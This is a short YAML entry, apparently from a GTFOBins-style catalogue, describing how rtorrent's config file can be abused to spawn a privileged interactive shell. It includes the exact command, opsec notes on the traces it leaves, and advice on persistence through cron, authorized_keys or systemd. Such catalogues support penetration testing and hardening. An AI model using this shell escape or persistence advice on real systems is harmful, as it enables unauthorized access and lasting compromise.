---
name: rtorrent
capabilities:
- exec
- spawn
required_permissions:
  level: user
difficulty: low
opsec:
  noise: medium
  artifacts:
  - ~/.bash_history
  - Process arguments visible in ps and auditd
  notes: ''
persistence_potential: true
examples:
- id: shell
  description: Spawn an interactive shell.
  capabilities:
  - spawn
  - exec
  command: |-
    echo 'execute = /bin/sh,-p,-c,"/bin/sh -p </dev/tty >/dev/tty 2>/dev/tty"' >~/.rtorrent.rc
    rtorrent
  notes: After the shell, exit with `Ctrl-Q`.
references:
- https://gtfobins.github.io/gtfobins/rtorrent/
tags: []
persistence_notes: Combine with write/exec primitives to drop cron entries, authorized_keys, or systemd units.
---
